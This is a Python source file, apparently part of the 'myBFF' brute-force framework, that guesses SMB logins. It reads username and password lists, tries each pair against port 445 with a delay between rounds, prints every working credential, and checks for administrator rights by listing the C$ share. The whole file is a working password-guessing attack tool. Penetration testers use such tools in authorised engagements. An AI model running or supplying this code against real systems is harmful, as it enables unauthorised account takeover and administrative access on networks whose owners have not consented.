#! /usr/bin/python
# Created by Kirk Hayes (l0gan)
# Part of myBFF, SMB guessing
import smb
from smb.base import SharedDevice
from smb.SMBConnection import SMBConnection
from core.smbModule import smbModule
import time


class SMBbrute(smbModule):
    def __init__(self, config, display, lock):
        super(SMBbrute, self).__init__(config, display, lock)
        self.fingerprint="smb"
        self.response=""
    def somethingCool(self, config, userID, password, server_name, conn, connection):
            try:
                shareList = conn.listPath('C$', '//')
                print("[!]        User is an Administrator!")
            except:
                print "[-]        User is not an Administrator"

    def connectTest(self, config, userID, password, server_name):
        conn = SMBConnection(userID, password, 'pycon', server_name, use_ntlm_v2=True, domain=config["domain"], sign_options=SMBConnection.SIGN_WHEN_SUPPORTED, is_direct_tcp=True)
        connection = conn.connect(server_name, 445)
        if connection:
            print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
            self.somethingCool(config, userID, password, server_name, conn, connection)
        else:
            print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])

    def payload(self, config):
        server_name = str(config["HOST"]).strip('smb://')
        if config["PASS_FILE"]:
            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
            for pass_line in pass_lines:
                if config["UserFile"]:
                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                    for line in lines:
                        config["USERNAME"] = line.strip('\n')
                        config["PASSWORD"] = pass_line.strip('\n')
                        userID = config["USERNAME"]
                        password = config["PASSWORD"]
                        self.connectTest(config, userID, password, server_name)
                    time.sleep(config["timeout"])
                else:
                    config["PASSWORD"] = pass_line.strip('\n')
                    userID = config["USERNAME"]
                    password = config["PASSWORD"]
                    self.connectTest(config, userID, password, server_name)
                    time.sleep(config["timeout"])
        elif config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(self.config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                userID = config["USERNAME"]
                password = config["PASSWORD"]
                self.connectTest(config, userID, password, server_name)
        else:
            userID = config["USERNAME"]
            password = config["PASSWORD"]
            self.connectTest(config, userID, password, server_name)
